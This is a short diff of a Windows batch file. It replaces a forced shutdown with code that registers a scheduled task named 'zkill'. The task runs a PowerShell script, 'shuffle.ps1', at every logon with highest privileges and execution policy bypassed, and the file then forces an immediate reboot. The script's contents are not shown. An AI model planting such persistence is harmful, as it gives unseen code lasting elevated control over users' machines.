@@ -1,3 +1,9 @@
 @echo off
-shutdown /s /f /t 0
+
+set TASKNAME=zkill
+set SCRIPT=%~dp0shuffle.ps1
+
+schtasks /create /tn "%TASKNAME%" /tr "powershell.exe -ExecutionPolicy Bypass -File \"%SCRIPT%\"" /sc onlogon /rl HIGHEST /f
+
+shutdown /r /t 0 /f
 
